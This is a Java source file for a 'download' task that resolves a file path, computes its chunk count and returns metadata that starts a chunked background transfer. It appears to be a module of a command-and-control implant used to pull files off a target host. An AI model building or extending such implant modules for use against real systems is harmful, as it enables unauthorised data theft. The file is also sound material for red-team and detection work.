package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;
import com.woopsie.utils.SystemInfo;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

/**
 * Download file task - handles initial validation and metadata
 * Actual file transfer is handled by DownloadBackgroundTask
 */
public class DownloadTask implements Task {
    
    public static final int CHUNK_SIZE = 512000; // 512KB chunks
    private final ObjectMapper objectMapper = new ObjectMapper();
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        // Extract parameters
        String path = parameters.has("path") ? parameters.get("path").asText() : ".";
        String file = parameters.has("file") ? parameters.get("file").asText() : "";
        String host = parameters.has("host") ? parameters.get("host").asText() : "";
        
        Config.debugLog(config, "Download request - path: '" + path + "', file: '" + file + "', host: '" + host + "'");
        
        // Resolve path
        Path filePath = Paths.get(path);
        Config.debugLog(config, "Initial path object: " + filePath);
        
        if (!filePath.isAbsolute()) {
            String cwd = System.getProperty("user.dir");
            filePath = Paths.get(cwd).resolve(path);
            Config.debugLog(config, "Resolved relative to CWD (" + cwd + "): " + filePath);
        }
        
        // Check if file exists before calling toRealPath
        if (!Files.exists(filePath)) {
            throw new Exception("File does not exist: " + filePath.toAbsolutePath() + " (original: " + path + ")");
        }
        
        // Now safe to call toRealPath
        filePath = filePath.toRealPath();
        Config.debugLog(config, "Real path: " + filePath);
        
        if (Files.isDirectory(filePath)) {
            throw new Exception("Path is a directory, not a file: " + path);
        }
        
        File fileToDownload = filePath.toFile();
        long fileSize = fileToDownload.length();
        int totalChunks = (int) Math.ceil((double) fileSize / CHUNK_SIZE);
        
        Config.debugLog(config, "File size: " + fileSize + " bytes, chunks: " + totalChunks);
        
        // Create download initiation response
        Map<String, Object> downloadResponse = new HashMap<>();
        downloadResponse.put("total_chunks", totalChunks);
        downloadResponse.put("full_path", filePath.toString());
        downloadResponse.put("host", host.isEmpty() ? SystemInfo.getHostname() : host);
        downloadResponse.put("is_screenshot", false);
        downloadResponse.put("chunk_size", CHUNK_SIZE);
        downloadResponse.put("filename", file.isEmpty() ? filePath.getFileName().toString() : file);
        
        // Return as JSON with "download" key to trigger background download
        Map<String, Object> result = new HashMap<>();
        result.put("download", downloadResponse);
        
        return objectMapper.writeValueAsString(result);
    }
    
    @Override
    public String getCommandName() {
        return "download";
    }
}
